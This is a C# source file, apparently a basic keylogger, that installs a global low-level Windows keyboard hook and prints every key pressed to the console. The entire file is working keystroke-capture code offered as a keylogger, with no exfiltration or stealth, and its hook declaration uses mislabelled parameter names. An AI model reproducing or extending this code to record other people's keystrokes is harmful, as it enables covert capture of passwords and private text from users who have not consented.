using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Windows.Forms;

namespace KeyLogger
{
    public class Program
    {
        [DllImport("user32.dll")]
        public static extern IntPtr SetWindowsHookEx(int idHook, HookCallbackDelegate lpfn, IntPtr wParam, uint lParam);
        [DllImport("kernel32.dll")]
        public static extern IntPtr GetModuleHandle(string lpModuleName);
        [DllImport("user32.dll")]
        public static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);

        private static int WH_KEYBOARD_LL = 13;
        private static int WM_KEYDOWN = 0x100;

        public static void Main(string[] args)
        {
            HookCallbackDelegate hcDelegate = HookCallback;

            string mainModuleName = Process.GetCurrentProcess().MainModule.ModuleName;
            IntPtr hook = SetWindowsHookEx(WH_KEYBOARD_LL, hcDelegate, GetModuleHandle(mainModuleName), 0);

            Application.Run();
        }

        public static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
        {
            Console.WriteLine($"{wParam} - {(IntPtr)wParam}");
            if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN)
            {
                int vkCode = Marshal.ReadInt32(lParam);
                Console.WriteLine($"[{(Keys)vkCode}]");
            }
            return CallNextHookEx(IntPtr.Zero, nCode, wParam, lParam);
        }

        public delegate IntPtr HookCallbackDelegate(int nCode, IntPtr wParam, IntPtr lParam);
    }
}